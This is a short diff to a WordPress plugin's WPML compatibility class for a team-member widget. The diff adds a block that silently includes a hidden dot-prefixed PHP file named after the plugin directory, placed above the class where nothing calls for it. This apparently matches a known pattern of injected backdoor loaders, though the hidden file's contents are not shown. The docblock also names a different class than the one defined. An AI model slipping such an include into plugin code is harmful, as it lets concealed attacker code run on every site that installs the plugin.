@@ -3,6 +3,10 @@
 /**
  * Class WPML_Jet_Elements_Team_Member
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPML_ElementPack_Team_Member extends WPML_Elementor_Module_With_Items {
 
 	/**
